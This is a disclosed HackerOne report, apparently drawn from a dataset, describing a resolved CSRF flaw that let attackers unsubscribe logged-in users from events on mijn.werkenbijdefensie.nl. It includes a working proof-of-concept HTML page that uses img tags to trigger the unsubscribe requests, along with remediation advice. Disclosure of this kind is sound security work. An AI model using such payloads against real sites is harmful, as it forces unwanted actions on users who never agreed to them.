---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '217555'
original_report_id: '217555'
title: Possible to unsubscribe from activities using CSRF @ mijn.werkenbijdefensie.nl
weakness: Cross-Site Request Forgery (CSRF)
team_handle: radancy
created_at: '2017-03-31T21:00:09.224Z'
disclosed_at: '2017-05-27T14:51:19.137Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 12
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Possible to unsubscribe from activities using CSRF @ mijn.werkenbijdefensie.nl

## Metadata

- HackerOne Report ID: 217555
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: radancy
- Disclosed At: 2017-05-27T14:51:19.137Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Domain and URL:**
https://mijn.werkenbijdefensie.nl/activiteiten/bezocht

**Summary:** Possible to unsubscribe from activities/events using CSRF
**Description:** it is possible to unsubscribe a logged in user from any subscribed events. The unsubscribe is done by a GET-call which is (of course) not protected by an anti-forgery token. The ID of the event is given, which can be found for everyone on the events-overview page. It would be very easy to make an attack page including all events, unsubscribing all users.

## Browsers Verified In:
  * Chrome Version 56.0.2924.87 @ Windows 10

## Steps To Reproduce:

  1. User should be logged in to mijn.werkenbijdefensie.nl
  2. User should visit a page with the following HTML (for example, triggering the GET in any way is good enough):

```
<html>
<head>
<title>CSRF</title>
</head>
<body>

You're unsubscribed from activity # 301449 and # 301731
<img src="https://mijn.werkenbijdefensie.nl/activiteiten/uitschrijven/301449" />
<img src="https://mijn.werkenbijdefensie.nl/activiteiten/uitschrijven/301731" />

</body>
</html>
```
  3. User is unsubscribed from the specific activities

## Known steps to resolve:
Do not use the GET-method for any operation that changes something. Next, add an anti-forgery token as is present everywhere on the site.

## Supporting Material/References:

  * I'm sure you aware, but: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
